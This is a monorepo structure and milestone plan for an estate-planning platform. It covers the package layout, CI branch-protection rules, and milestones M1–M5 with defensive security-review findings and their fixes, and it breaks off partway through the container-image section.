# Estate Planning Platform — Monorepo Structure & Milestone Plan

**Version:** 1.0 · Approved 2026-07-20. Companion to `00`–`03`. This records the agreed
repository layout, boundary rules, and the milestone sequence for implementation.

## Tooling

pnpm workspaces + Turborepo. Version policy via pnpm **catalogs** (`pnpm-workspace.yaml`);
dependency build scripts blocked by default (`onlyBuiltDependencies` allowlist, kept
near-empty). Strict TypeScript everywhere via `packages/config/tsconfig.base.json`.
Backend targets CommonJS; internal packages are consumed through their built `dist`
(Turborepo orders `^build`) — no TS path aliases.

## Layout

```
apps/
  web/                  Next.js (dashboard, auth, vault UI)
  bff/                  GraphQL BFF — persisted queries, depth/complexity limits
  services/             one NestJS app per bounded context (docs/01 §2)
    identity/ profile/ assets/ documents/ vault/ settlement/
    ai-assistant/ referral/ notifications/ search-indexer/ audit/
packages/
  config/               tsconfig base, jest preset
  contracts/            Kafka event schemas (zod), internal API types, GraphQL manifest
  crypto/               SERVER-side envelope encryption (KMS-wrapped DEKs), blind indexes
  vault-crypto/         CLIENT-side Zone A crypto (2SKD, SRP) — isolated, minimal deps
  db/                   migration runner + generators for docs/02 conventions
  audit-emitter/        typed audit producer — IDs/enums only, enforced at runtime
  auth-guard/           session verification (introspection), step-up freshness — SHIPPED 2026-07-23
  kafka/                topic registry, producer/consumer wrappers, Zone B payload crypto
  ui/                   design system (Tailwind, WCAG AA+, dark mode)
  testing/              testcontainers harnesses, fixtures
infra/
  terraform/{modules,envs}/   helm/   argocd/
tools/                  codegen, release scripts
docs/                   00–04 + docs/adr/ going forward
```

## Boundary rules (enforced, not aspirational)

1. **Each service owns its migrations** (`apps/services/<svc>/migrations/`). No shared
   migrations, no cross-cluster joins; consistency via events (docs/02 §8).
2. **Local dev runs six separate Postgres containers** (`docker-compose.dev.yml`) so no
   code ever assumes cluster co-location. Ports 5433–5438.
3. **`vault-crypto` ≠ `crypto`.** Zone A client-side code is its own package with a
   near-zero dependency tree (TB6 audit surface). Server-side `crypto` (KMS) must never
   be importable from `apps/web` — lint-enforced.
4. **Services never import each other** — only `packages/*`. `web` may import `ui`,
   `contracts`, `vault-crypto` only.
5. **CI security gates run on every push and PR, and five of them are merge-blocking
   on `main`** (enabled 2026-08-07): `build-and-test`, `secret-scan`, `codeql`,
   `stack (development)`, `stack (production)`, with `strict: true` so a PR must be up
   to date with `main` before it can merge. Force-pushes and branch deletion are
   blocked. `enforce_admins` is deliberately **off** — the owner keeps an override, so
   a wrong context list is an inconvenience rather than a lockout of the default
   branch; turn it on once protection has been lived with. tfsec/OPA join the set once
   Terraform lands.

   **Deliberately NOT required**, and each for its own reason:
   - `stack-from-images` and the twelve `build (…)` matrix jobs — sound, but ~15 minutes
     on every merge, and both of the flakes observed on 2026-08-07 (a grype crash and a
     transient `migrate-documents`) lived there. Requiring them would have blocked two
     legitimate merges that day. Add them when the image path stops flaking.
   - `dependency-review`, `notify-on-failure` (and its called-workflow spelling
     `notify-on-failure / open-or-update-issue`), and `CodeQL` — these report **skipped**
     on some events, and a required check that reports skipped never satisfies the
     requirement, so requiring any of them blocks every merge until protection is
     deleted. `codeql` (the job) is required; `CodeQL` (the code-scanning integration's
     own check) is not.

   Two preconditions worth stating because neither is obvious. No workflow producing a
   required context may gain a `paths:` filter — a PR that did not match it would never
   produce the check, and an absent required check is unsatisfiable, not skipped. And
   `allow_auto_merge` is now on, so `gh pr merge --auto` means "merge when green"
   instead of "merge now".

   HISTORY, kept because the claim was wrong in both directions inside one day. This
   rule originally said "merge-blocking from commit one", which was aspiration recorded
   as fact: `main` had never had branch protection, so no gate had ever mechanically
   blocked anything. That gap was not cosmetic — the scheduled secret sweep failed
   seventeen consecutive runs while every merge proceeded, because a red check that
   blocks nothing is a notification, and an unread notification is nothing. It was
   corrected to "not merge-blocking" on the morning of 2026-08-07 and made true that
   evening by actually enabling protection.
6. **A CI gate never holds a hand-maintained list of what it covers — it derives the
   list from the tree.** Specifically: *a diagnostics step must derive its container
   set* (`compose ps -a --services`), never name services inline. This is a rule
   because the same drift has now cost three times, in three different shapes: a
   hand-copied `migrate-*` list that never learned about `migrate-notifications` (M9),
   a `web.Dockerfile` comment asserting `public/` was empty long after the redesign
   vendored a typeface into it (2026-08-06), and an `if: failure()` diagnostics step
   whose nine hand-named services excluded every one-shot job — so a `migrate-documents`
   failure printed sixty lines each from healthy containers and nothing from the one
   that died (2026-08-07). All three passed every gate: a list maintained by memory,
   beside a thing that grows, fails silently and reads as coverage. The corollary is
   that the derivation must degrade rather than gate — if the derivation itself fails,
   print its error and fall through to an undifferentiated dump; the enhancement may
   fail, the diagnostic may not.

## Milestones

### M1 — Secure walking skeleton (shipped 2026-07-21; open items below)
Foundation packages (`config`, `contracts`, `crypto`, `db`, `audit-emitter`,
`auth-guard`) + **identity service** (auth-cluster DDL per docs/02 §1, registration with
encrypted email + blind index, Argon2id, passkeys, TOTP, sessions with refresh rotation,
step-up ≤5 min window, Cedar deny-by-default PEP) + **audit service** (Kafka consumer,
append-only hash-chained `audit_events`, chain verification) + thin BFF and Next.js auth
flows. **Acceptance:** E2E register → login → step-up → gated action → audit event
verified in chain; automated schema-convention checker passes (soft delete, `_versions`
tables, REVOKEs); no plaintext PII in logs under integration inspection; coverage gates
95/90.

**M1 status.** Shipped: foundation packages; identity service (WebAuthn schema in
place, endpoints deferred); audit service; GraphQL BFF (persisted operations enforced
in production, httpOnly-cookie sessions, CSRF header, masked errors); Next.js auth
flows (register/login/TOTP/step-up, design tokens, dark mode, AA+); walking-skeleton
E2E (`apps/e2e`, PG-gated) proving identity's exact produced bytes ingest into a
verified audit hash chain; schema-convention checker (`@estate/db checkConventions`)
run against both migrated schemas; CI guard failing the build if integration suites
would silently skip. **Open items rolling into M2:** Cedar PDP integration (guards
are deny-by-default but policy engine not wired), WebAuthn endpoints, Kafka
broker-hop E2E (needs Redpanda locally/in CI — current E2E bridges producer bytes to
the ingestor in-process), AWS KMS adapter (LocalKmsProvider is dev-only), coverage
thresholds (CI now prints coverage; gate at 95/90 once CI-measured numbers exist),
monthly audit partitions + S3 Object Lock anchoring, identity logout/revocation
endpoint, BFF depth/complexity limits.

**M1 security review (2026-07-21).** A focused review of the shipped code found no
exploitable vulnerability in the committed (dev) configuration. One production-conditions
finding is tracked here for M2:
- *Registration account-enumeration timing channel (Medium).* `register()` equalizes
  response body/status and the Argon2 cost, but the new-email path awaits extra KMS + DB
  + Kafka work; under production wiring an existing email returns measurably faster,
  giving a membership oracle. Not exploitable today (dev uses in-process KMS/audit
  doubles). Fix direction: an email-verification flow returning a fixed-shape, fixed-time
  response regardless of address existence. Decoy work (risks orphaned DEKs) and
  fire-and-forget publishing (breaks the audit-before-completion invariant) are both
  rejected as fixes. Docstring on `auth.service.ts register()` no longer overclaims.
Verified clean in review: AEAD/AAD binding, blind-index domain separation, opaque-token
handling, session/step-up guards, refresh rotation-reuse, all parameterized SQL and the
identifier-validating generators, the migrator, Kafka-message deserialization + PII
firewall, and the BFF cookie/CSRF/persisted-operations model.

### M2 — Security hardening + profile/contacts (in progress)
Shipped so far on `claude/m2-security-hardening`: `@estate/kms-aws` (production
AWS KMS provider, wired into identity — prod uses AWS KMS, dev LocalKmsProvider,
fail-fast); `@estate/authz` (Cedar PDP, deny-by-default, owner/beneficiary
policies); WebAuthn passkey register/authenticate in identity (passkey as a
step-up factor) with its audit actions added to `@estate/contracts` and emitted
to Kafka; per-package **coverage gates** (jest thresholds set just below current
coverage, ratcheting toward 95/90 — CI runs `pnpm test --coverage`). Profile &
contacts service (core cluster) — **shipped**: field-encrypted profiles/family/
contacts/role assignments/permission grants, the first Cedar PEP (`ProfileAuthz`,
deny-by-default) proving the §5.5 beneficiary ABAC (a grant-holder reads only the
named resource), caller identity via gateway-injected `x-estate-user-id`.

**M2 follow-ups noted while building:**
- **Cross-request DEK race (crypto package).** ~~`getOrCreateDek` is
  find-then-insert; two concurrent first-writes for the same brand-new user can
  each mint a DEK.~~ **Resolved.** The intra-request parallel race was fixed in
  M2 (pre-materialize the DEK before parallel field encryption); the
  cross-request DB guard shipped with M3 — `ux_deks_user_active` partial unique
  index on all three DEK-bearing clusters (financial from day one; auth+core
  backfilled by each service's `002_dek_unique_active.sql` with a pre-flight
  dedupe) plus 23505→`DekConflictError` adopt-the-winner in every
  `PgDekRepository`.
- Core-cluster **domain-event** contracts/topic (profile emits audit events only
  for now); ~~real cross-service session verification to replace the trusted
  `x-estate-user-id` header~~ **Resolved (2026-07-23):** `@estate/auth-guard`'s
  `CallerGuard`/`StepUpGuard` introspect the caller's bearer token via identity's
  `GET /v1/auth/session` (both headers retired together); the `SessionVerifier`
  interface leaves the OIDC/JWT local-verify end-state a drop-in. Asset-scoped
  beneficiary ABAC when the asset service lands; a Cedar schema for `validateRequest`.

**M2 security review (2026-07-21).** Structured review (discovery + adversarial
filter) of the M2 diff: no authz bypass, injection, crypto, or data-exposure vuln
above the bar; the Cedar PEP, per-user field encryption, KMS context-binding, and
WebAuthn origin/challenge/clone controls all verified fail-closed. One confirmed
finding, **fixed in-branch**:
- *WebAuthn step-up accepted user-presence, not user-verification (Medium).* The
  passkey ceremony that elevates a session to step-up used `userVerification:
  'preferred'` and omitted `requireUserVerification` at verify, so a presence-only
  tap could satisfy step-up — the same gate as a TOTP code (docs/01 §5). In-scope
  for the docs/03 §2 device-access adversary. Fixed: `userVerification: 'required'`
  in both option generators, `requireUserVerification: true` at both verify calls,
  and the step-up elevation now gated on `authenticationInfo.userVerified`.

### M3 — Asset ledger (first half shipped 2026-07-21; Plaid isolate shipped 2026-07-22)
Scope agreed: manual-asset ledger first (backend only), Plaid isolating service as a
separate second PR — `plaid_items`/`accounts` DDL deliberately deferred with it so no
dormant schema gets frozen by migration drift detection.

**Shipped:** `apps/services/assets` (financial cluster) — event-sourced write model
per docs/02 §3: `asset_events` (append-only, encrypted payloads AAD-bound to
`user_id`+`event_id`) → `assets_view` + `asset_beneficiaries` projected in the SAME
transaction through a pure reducer (`projection.ts`); projection rebuild CLI
(`rebuild-cli.js`, report/`--repair`) as the docs/02 §8 DR integrity check, decrypting
as actorType `system`/purpose `projection_rebuild`; optimistic concurrency
(`version` = latest seq, `If-Match`) + per-command idempotency (client `eventId`,
unique index); as-of temporal queries (`?asOf=` on list/net-worth) by ledger replay;
beneficiary designations with share-sum ≤ 100 enforced app-side (422) AND by a DB
constraint trigger; step-up gating on beneficiary changes via `StepUpGuard`;
Cedar PEP (`AssetsAuthz`, owner-only, deny-by-default); audit actions `asset.*` +
domain topic `estate.asset.events.v1` (`asset.ledger.appended`, IDs/enums only);
`withTransaction` sets the `app.actor_id` GUC so `_versions` rows carry attribution
(first service to do so). Also landed: the M2 **cross-request DEK race fix** —
`@estate/crypto` `DekConflictError` + adopt-the-winner in `getOrCreateDek`, with a
partial unique index `ux_deks_user_active` on the financial cluster from day one.

**Explicit deviations (surfaced, not silent):** step-up asserted via
gateway-injected `x-estate-stepup-verified` at the same M2 trust level as
`x-estate-user-id` (real session/step-up verification remains the upgrade for
both); additive DDL vs docs/02 §3 (event-id unique index, `(user_id, occurred_at)`
index, beneficiary live-row unique index, deks unique index — propose folding into
docs/02 v1.1); share-sum trigger enforces ≤ 100 rather than the docs' "sum to 100"
(strict equality is unenforceable during incremental designation; the API reports
`designationComplete`); `assets_view` exempt from business-table conventions (no
`_versions` — its history IS the ledger; verified by custom int-test assertions);
domain topic carries IDs/enums only, so docs/01 §4 Zone B Kafka payload crypto is
not yet exercised (prerequisite for any value-bearing consumer).

**Shipped since (M3 continued):** deks unique-index backfill for auth+core —
`002_dek_unique_active.sql` in identity and profile. Design: pre-flight dedupe
retires a raced double ONLY when verified unreferenced (`destroyed_at` means
crypto-shredded, so retirement must be proven safe): explicit `dek_id` columns
on live AND soft-deleted rows plus `*_versions` row images; in the auth cluster
additionally the IMPLICIT binding of `mfa_methods.secret_ct` (no dek_id column
— encrypt/decrypt resolve the newest active DEK), so with MFA rows present the
newest active DEK counts as referenced. Keeper = the referenced DEK, else the
newest; if >1 active DEK of one user is referenced the migration RAISEs and
rolls back (SQL has no KMS access — runbook: re-encrypt onto one DEK, re-run).
Both `PgDekRepository.insert`s translate 23505→`DekConflictError` (adoption in
`@estate/crypto`). Int tests cover the race on both clusters plus staged-
migration dedupe cases (keeper selection, soft-delete/version references,
implicit MFA binding, abort-and-retire-nothing).

**Shipped (M3 second half): Plaid isolating service** — `apps/services/plaid`, a
SEPARATE app on the financial cluster (disjoint tables, own migrations dir; the
migrator tolerates co-owned clusters). TB5 isolation is cryptographic: DEKs under a
dedicated `plaid/kek` alias in the service's own `plaid_deks` table (unique-active
index from day one), so the asset service's KMS grant can never unwrap a token DEK.
`plaid_items`/`accounts` DDL per docs/02 §3 plus additive `item_id_ct` + UNIQUE
`item_bidx` blind index (webhook routing). Flows: link-token → public-token
exchange (token encrypted, per-item AAD) → sync (the ONLY token-decrypt site with
revoke, audited with explicit purposes) → verified webhooks (ES256 JWT on
node:crypto: pinned alg, kid via gateway, iat freshness, constant-time raw-body
hash; failures audited, no existence oracle) → step-up-gated per-item revocation
(provider remove best-effort, local soft-delete atomic). Anomalous-sync hook emits
`plaid.sync.anomalous` past a sliding-window threshold. Gateway is an interface:
deterministic stub (dev/test, signs real webhooks) + fetch-based live client
(mock-transport tested); production config REQUIRES live mode + credentials. Domain
topic `estate.plaid.events.v1` and all audit actions are IDs/enums/counts only,
asserted end-to-end (`plaid.int.spec.ts` token firewall; `plaid.e2e.spec.ts` audit
hash-chain proof).

**M3 follow-ups:** local contact-link projection from core domain events →
`namedBeneficiaries` beneficiary ABAC + contact existence validation; transactional
outbox for post-commit audit/domain emits; `DocumentAttached` event + photos (M4);
as-of replay snapshotting at scale; category is immutable in M3 (recategorize =
retire + recreate).

**M3 security review (2026-07-22).** Structured review (four parallel discovery
passes — webhook crypto, Plaid token-isolation/authz, DEK-dedupe migrations, asset
ledger — each finding adversarially re-verified against source) of the whole merged
M3 range. No critical or app-surface-exploitable vulnerability. Verified fail-closed:
object-level authz (ownership always loaded from the row → Cedar owner-only,
deny-by-default) across both new services; Plaid token isolation (decrypts only at
sync/revoke, never in responses/events/errors/logs); config fail-fast (prod cannot
run the stub gateway or local KMS; `plaid/kek` cannot collide with `financial/kek`);
ledger payload AAD binding to `user_id`+`event_id`; optimistic-concurrency/idempotency
cannot bypass authz; BigInt money math; all SQL parameterized; the dedupe
shred-safety theorem (no referenced DEK is ever retired); adopt-the-winner key
handling. Three bounded findings, all **fixed in-branch** (`claude/m3-security-review-fixes`):
- *`assets_view` column AAD not bound to `asset_id` (Low, insider/DB-tamper).* The
  four projection ciphertext columns were sealed with AAD `asset.<field>` — bound to
  `(user_id, field)` only — so a financial-cluster write adversary (docs/03 TB4) could
  relocate one of the owner's own blobs between their assets and it would decrypt under
  the API. Bounded: not reachable via the app surface; same-user only; the authoritative
  `asset_events` payload is correctly bound to `event_id`, so a projection rebuild
  re-derives truth. A deviation from the codebase's own convention (Plaid binds row id,
  the ledger binds `event_id`). Fixed: `viewField(assetId, field)` → `asset.<assetId>.<field>`;
  changing the AAD is a re-encryption handled by `rebuild --repair`.
- *Unauthenticated webhook forced a pre-signature outbound Plaid key-fetch (Low/Medium,
  DoS/amplification).* `keyFor(kid)` ran before the signature check and unknown kids were
  never cached, so a stream of JWTs with novel kids drove one outbound Plaid call each,
  burning the service's rate-limit budget. The ES256/JWT crypto itself was sound. Fixed:
  short-TTL negative cache for unresolved kids (legitimate rotation still refetches once
  it expires).
- *DEK-dedupe "newest MFA DEK" tiebreak disagreed with the runtime resolver (Low, latent
  crypto-shred).* `findActiveByUser` used `ORDER BY created_at DESC LIMIT 1` with no
  tiebreak, while the 002 migration's part C uses `created_at DESC, dek_id DESC`; since
  `created_at` is a client-side ms `Date`, a raced tie could make the two disagree and
  shred the live MFA DEK. Not reachable through identity's current paths (the DEK is
  pre-materialized once per registration with a fresh `userId`), but a real footgun in the
  safety-net migration. Fixed: added `, dek_id DESC` to `findActiveByUser` in all four DEK
  repositories so runtime and migration resolve identically. (The merged 002 migration is
  immutable and needed no edit — aligning the resolver closes it.)
Informational nits left as-is: Plaid `sync`/`revoke` 404-vs-403 item-existence oracle
(gated by unguessable UUIDs); webhook-driven sync audited as `actorType:'user'` not
`system` (audit fidelity); in-window webhook replay (inherent to Plaid's iat-only model);
`IsoDateSchema` accepts calendar rollovers (`2026-02-30`).

### M4 — Document service (documents cluster; both PRs in review)
Scope agreed 2026-07-23, two PRs like M3: **PR1** template matrix + generation
pipeline (plus the object-store/encryption substrate generation depends on);
**PR2** the upload-facing Zone B Document Vault — upload ingest, malware-scan
port (clamd INSTREAM live adapter), OCR port (Textract-shaped live adapter),
per-user-keyed encrypted search tokens, and `documents.e2e.spec.ts` (audit
hash-chain proof over generation + upload). BFF unchanged (no documents
resolvers yet), consistent with M3.

**PR1 (this branch): `apps/services/documents`** mirroring the assets/plaid
service template (fail-fast config, Db/withTransaction with `app.actor_id`
GUC, `@estate/db` migrator + conventions, `@estate/auth-guard` verification,
Cedar owner-only PEP, IDs/enums-only audit + domain events on
`estate.document.events.v1`):
- **docs/02 §4 DDL** with additive columns (called out inline):
  `document_templates.variables` (typed intake declaration),
  `document_templates.body_sha256` (content pin), templates gain
  updated_at/deleted_at + a `_versions` shadow (activation is audit surface),
  `ux_document_templates_active` (one active version per doc_type+state),
  `document_versions.size_bytes/mime`, `ix_documents_user`.
- **Per-OBJECT DEKs** (docs/01 §4's parenthetical, implemented literally):
  `document_deks` keys wrapped DEKs by DOCUMENT id (unique-active index +
  `DekConflictError` adoption); `documents.dek_id` references the document's
  content DEK, so crypto-shredding one document erases exactly its versions.
  Content AAD binds document id + owner user id + version + plaintext sha256
  (the M3-review F1 lesson, from day one). Sensitive document CONTENT lives only
  inside encrypted blobs; `documents.title` is a user-supplied plaintext
  display/index label (like `assets_view.title`), treated as low-sensitivity
  metadata — see the M4 security review for the corrected wording.
- **ObjectStore port** (in-service, plaid-gateway precedent):
  `LocalFsObjectStore` (dev/test) + `S3ObjectStore` (`If-None-Match:*`
  immutability, stubbed-transport tests); production config REQUIRES s3 mode.
  Both stores refuse traversal keys and mutation — a put to an existing key
  must be byte-identical (idempotent republish) or it errors. Blobs are
  ciphertext only.
- **Template matrix "versioned like code" — literally.** Sources in
  `apps/services/documents/templates/<state>/<doc_type>/vN.json` with
  schema-MANDATORY `legalReview` sign-off metadata + per-state
  `execution_requirements` + a typed `variables` declaration;
  `template-publish-cli.ts` is the ONLY write path (no runtime template API —
  git review is the sign-off gate). Published versions are immutable
  (re-publish identical = no-op, changed bytes = error); the loader verifies
  `body_sha256` + row identity before parsing (tamper fails closed). Seeds
  are three EXEMPLAR templates (CA will, TX durable POA, NY living will)
  proving the matrix machinery — real 50-state attorney content is a legal
  deliverable, not code.
- **Renderer:** in-repo deterministic engine (no template library on a
  security-critical path): strict `{{placeholder}}` substitution + boolean
  `when` conditionals only; intake validated against the template's typed
  declaration (`.strict()` — undeclared data cannot reach a render); every
  value HTML-escaped; unsubstitutable placeholders fail closed. Output is
  canonical HTML → `content_sha256` is reproducible (content addressing).
- **Generation pipeline** (`POST /v1/documents/generate`, **StepUpGuard** —
  docs/01 §5 makes document generation a mandatory step-up action; deletion
  is equally gated): resolve active template → validate intake → render →
  encrypt under the document DEK → store blob → documents + document_versions
  in one transaction. Regeneration (`POST .../versions`, step-up) uses
  If-Match on current_version and is REFUSED once signing starts
  (revoke/supersede first). Intake variables are deliberately NOT persisted —
  the encrypted rendered artifact is the record.
- **Execution-status tracking:** requirements-parameterized ladder
  (signed → [witnessed] → [notarized] → executed; revoked/superseded), no
  skipping required steps, `executedAt` accompanies exactly the `executed`
  attestation; transitions audited + domain-published. Legal-hold enforcement
  ships now (blocks deletion, 409); the SETTING surface belongs to
  settlement (M7). `sealed` remains a dormant flag until M6 client-side
  crypto exists.
- **Tests:** 94 local unit tests (renderer escaping/determinism/fail-closed,
  template cross-validation, state machine, both object stores incl.
  traversal + immutability, service pipeline with real crypto over in-memory
  stores, PII firewall, config fail-fast) + PG-gated `documents.int.spec.ts`
  (real migrations + checkConventions, real publish-CLI run over the real
  seeds, supertest flow: 401/403/step-up/ciphertext-at-rest/audited
  decrypt/ladder/If-Match/legal hold/soft-delete attribution) + ci-guard;
  coverage floor 65/58/50/65 ratcheting toward 95.

**PR2 (Zone B Document Vault — uploads, scan, OCR, encrypted search):**
- **Upload ingest** (`POST /v1/documents/upload`, CallerGuard — the docs/01
  §5 step-up list covers generation/export/deletion, not adding content):
  strict-base64 JSON transport (10 MiB decoded cap, 16 MiB body limit; ONE
  parser on the untrusted path — no multipart library added to the fuzz
  surface), magic-byte sniffing cross-checked against the declared mime
  (allowlist pdf/png/jpeg/tiff; polyglots and script-bearing types like
  SVG/HTML refused), then a FAIL-CLOSED malware scan: infected or
  scanner-error content is never stored anywhere (422 `malware_detected` /
  503 `scan_unavailable`, audited `document.scan.rejected` with sanitized
  third-party signature tokens). Uploads land as `source='uploaded'`,
  status `draft`, doc_type widened to DOCUMENT_KINDS (instrument types +
  docs/00 §8 vault categories).
- **MalwareScanner port:** deterministic EICAR-detecting stub (dev/test) +
  clamd INSTREAM client written directly on node:net (length-prefixed
  chunks, zero terminator, OK/FOUND/ERROR parsing, timeouts — no dependency
  on a security-critical path); production config REQUIRES clamd mode.
- **OcrEngine port:** stub (printable-run extraction, dev/test) + AWS
  Textract sync DetectDocumentText adapter (stubbed-transport tested);
  production REQUIRES textract mode; async/multi-page Textract is a tracked
  scale follow-up. OCR runs inline pre-insert (document_versions is
  append-only, so `ocr_indexed` is set at insert; a background worker is a
  scale follow-up alongside async Textract). OCR output is UNTRUSTED DATA:
  best-effort (failure ⇒ stored un-indexed, title-searchable), sealed as an
  encrypted artifact under the document's DEK (AAD binds doc/owner/version/
  artifact-type), reduced to HMAC tokens — never parsed, logged, or treated
  as instructions (docs/03 risk #6).
- **Encrypted search** (`GET /v1/documents/search`): `document_search_tokens`
  (002 migration) holds per-user-keyed HMAC keyword tokens (userKey =
  HMAC(SEARCH_INDEX_KEY, userId); cross-user correlation cryptographically
  impossible; accepted leak = token counts). A derived, rebuildable
  projection in the assets_view conventions category: replace-in-place on
  re-index, filtered against soft-deleted docs at query time, purged with
  the DEK on legal erasure. Generated documents index through the same
  pipeline (title + rendered text; re-indexed on new versions); queries are
  tokenized identically and matched ciphertext-side — search decrypts
  nothing. Binary content downloads as base64 (`ContentDto.encoding`).
- **Threat-model delta (docs/03):** TB1 — the upload parser surface is one
  strict-base64 JSON schema + magic-byte sniffing with adversarial unit
  tests (polyglots, undeclared types, oversize, malformed base64); TB5 —
  two new third-party edges (clamd, Textract) behind in-service ports with
  fail-closed (scan) / fail-soft (OCR) semantics and third-party output
  sanitization before audit. New audit actions: `document.uploaded`,
  `document.scan.rejected`, `document.ocr.indexed`.
- **Tests:** 129 local unit tests (adds clamd protocol incl. split replies +
  fail-closed matrix, sniffing adversarial cases, tokenizer/keying, upload
  pipeline: infected-never-stored, scanner-outage 503, OCR-failure
  non-fatal, per-user search isolation, re-index on new versions); int suite
  extends to upload → ciphertext-at-rest (blob + OCR artifact) → search →
  EICAR rejection; NEW `apps/e2e/documents.e2e.spec.ts` proves the full M4
  flow (publish → step-up generation → upload + EICAR rejection → encrypted
  search → step-up deletion) with every produced audit byte ingested into
  the audit service and the hash chain cryptographically verified, domain
  envelopes schema-validated, and a content/PII firewall sweep across the
  bus.

**M4 security review (2026-07-24).** Structured review of the whole merged M4
range (both PRs): five parallel discovery passes — upload/scan/sniff ingest,
per-object DEK crypto, encrypted search + OCR, template engine/renderer/publish,
and authz/step-up/PII-firewall/config — each candidate finding adversarially
re-verified against source. **No critical or app-surface-exploitable
vulnerability.** Verified fail-closed / sound: the content AAD binding
(document + owner + version + sha256 — the F1 splicing attacks all refuted, even
same-owner cross-document); fail-closed, strictly pre-storage scan ordering
(infected/errored bytes never reach the object store or DB) with clamd's
length-prefixed framing preventing verdict injection and signature
sanitization clamped to the audit grammar; per-user domain-separated HMAC search
keys (no cross-tenant token correlation) with tenant/soft-delete-safe AND-match
SQL and OCR treated as inert untrusted data; the renderer's complete
HTML-escaping with every intake sink in text context and fail-closed placeholder
substitution; the sha256-pinned, fail-closed template loader + immutable publish
+ atomic activation; object-level authz always derived from the persisted row
(deny-by-default, owner-only); step-up on exactly generation/regeneration/
deletion via the verified session; legal-hold enforced inside the row-locked
transaction; and the audit PII firewall as a hard schema gate with config
fail-fast in production. Findings, all **fixed in-branch**
(`claude/m4-security-review-fixes`):
- *Execution-requirements ladder failed OPEN (Medium).* `requirementsFor` fell
  back to `DEFAULT_REQUIREMENTS` (0 witnesses, no notary) for a GENERATED
  document whose template row was missing (e.g. soft-deleted — `findById`
  filters `deleted_at IS NULL`) or whose `execution_requirements` column was
  unparseable, silently collapsing a will/POA's ladder to signed→executed and
  dropping the state-mandated formalities (docs/03 risk #8). Not reachable
  through a normal live template, but a real fail-open on a legal gate. Fixed:
  uploads still use `DEFAULT_REQUIREMENTS`; a generated document now reads its
  requirements from the sha256-verified template SOURCE via `engine.load` and
  throws (`template_unavailable`) if the template is gone — which also extends
  the `body_sha256` integrity pin to the ladder (closing a second finding: the
  requirements were previously read from an unverified DB column).
- *Regeneration re-minted a live DEK after crypto-shred (Low, shred-invariant).*
  `newVersion` never checked the document's DEK was still active; since legal
  erasure preserves the document row, regenerating a crypto-shredded document
  drove `getOrCreateDek` to mint a FRESH live DEK (the partial unique index
  permits it alongside the destroyed row), defeating the erasure guarantee while
  leaving `dek_id` pointing at the destroyed key (an un-servable version). No
  disclosure of erased data (the read path pins the destroyed `dek_id` → Gone).
  Fixed: `newVersion` refuses when the document DEK is destroyed, surfacing
  `Gone` exactly as reads do — no re-mint.
- *Scan gate written fail-OPEN in style (Low).* `upload` admitted any verdict
  that wasn't literally `infected`; the closed `clean|infected` union made it
  safe today, but a future verdict variant would be silently admitted. Fixed:
  admit only `verdict === 'clean'`; the type system now surfaces any new variant
  as a compile error at the gate.
- *Scanner signature not re-clamped at the audit egress (Low, hardening).*
  `events.scanRejected` trusted each scanner adapter to have sanitized the
  third-party signature name; the `AuditEmitter` schema gate was the only
  backstop. Fixed: re-apply `sanitizeSignature` at the egress so the PII
  firewall never depends on the adapter.
- *Unbounded clamd response buffering (Low, not uploader-reachable).* The clamd
  client re-`concat`'d the whole response on every socket event with no byte cap
  and only an inactivity timeout, so a compromised/MITM'd clamd peer dribbling
  bytes without a NUL could grow memory/CPU past the budget. Fixed: an 8 KiB
  response cap + a hard deadline alongside the inactivity timeout, both
  fail-closed.
- *Exemplar templates could be published-active to a real matrix (Low,
  process).* The legal sign-off gate is structural (the schema can't tell a
  placeholder from real attorney sign-off), and the seed exemplars ship
  `activate: true` with placeholder `legalReview`. Fixed: the publish CLI refuses
  placeholder-marked sources when `NODE_ENV=production` (dev/test, which publish
  the seeds to prove the matrix, are unaffected).
- *Documents cluster overclaimed "no plaintext-PII columns" (Info).*
  `documents.title` is a user-supplied plaintext label (needed for listing +
  encrypted-search indexing without per-row decrypt), exactly like
  `assets_view.title`. Corrected the CLAUDE.md decision log + docs/04 wording to
  describe title as accepted low-sensitivity metadata rather than claiming zero
  plaintext PII (the M1 "no longer overclaims" precedent); no code change.
Informational / follow-ups left as-is: orphaned active DEK + ciphertext on a
rolled-back generate/upload (erasure-completeness gap — a `document_deks`
orphan-sweep keyed off rows with no referencing `documents.dek_id` is the fix,
folded into the existing transactional-outbox follow-up, since both stem from
work outside the commit); 404-before-403 existence oracle on object routes
(bounded by unguessable UUIDs — same class as M3's Plaid oracle, left as-is);
audit/domain emit after commit without an outbox (existing M3 follow-up);
Textract sync `DetectDocumentText` covers PNG/JPEG only, so prod PDF/TIFF OCR
no-ops until the async-Textract follow-up lands; the retention job must purge
`document_search_tokens` in lockstep with DEK destruction (retention-job
responsibility, outside the service); read path echoes the stored
`content_sha256` rather than recomputing (the AAD already binds it); no
per-user upload quota (edge/rate-limit concern, TB1).

### M5 — Containerization + supply chain (in progress); cloud environment deferred

M5 was planned as "Terraform/EKS to a real dev environment" and has been **split**.
The cloud half needs an AWS organization, billing, and CI credentials that do not
exist yet (est. ~$420–1,100/mo for a dev tier), so it is deferred until that is in
place. What ships now is the half that is a hard prerequisite for it and costs
nothing: **container images and their supply chain.** `infra/` previously held no
files and the repo had no Dockerfiles at all — nothing was deployable anywhere.

**Shipping now (PR1):**
- **One parameterized image recipe** — `infra/docker/node-service.Dockerfile`
  builds all seven Node apps (six services + BFF) selected by an `ARG PKG`,
  rather than seven near-identical files that drift; a hardening change lands in
  exactly one place. `infra/docker/web.Dockerfile` is separate only because
  Next.js emits a traced `standalone` bundle instead of `dist/main.js`.
- **Build shape:** `turbo prune --docker` → install from the manifest-only layer
  (so dependency installs cache until a package.json changes) → `turbo build`
  (which orders `^build` for the internal packages) → `pnpm deploy --prod` to
  collect the production closure.
- **Hardening per docs/01 §3:** distroless runtime (no shell, no package
  manager), non-root uid 65532, exec-form CMD, and a glibc build base matched to
  the distroless image so the prebuilt native addon (`@node-rs/argon2`) matches
  its host ABI. Read-only rootfs is a pod securityContext setting and lands with
  the Helm charts; nothing in these services writes to local disk in production.
- **CI (`.github/workflows/images.yml`):** builds all eight images, generates an
  SPDX **SBOM** per image, scans with grype (fails on high/critical), and
  **smoke-tests the fail-fast posture** — a service image run with no environment
  must exit non-zero with its own config-validation error, which proves the
  shipped artifact still refuses to boot misconfigured (the property every
  service's `config.ts` asserts, now verified in the container rather than only
  in unit tests). The BFF is asserted differently and deliberately: every one of
  its settings has a development default, so bare it starts and serves — its
  fail-fast guard is production-only (persisted operations are mandatory there),
  so it is smoke-tested under `NODE_ENV=production`. Every run is wrapped in a
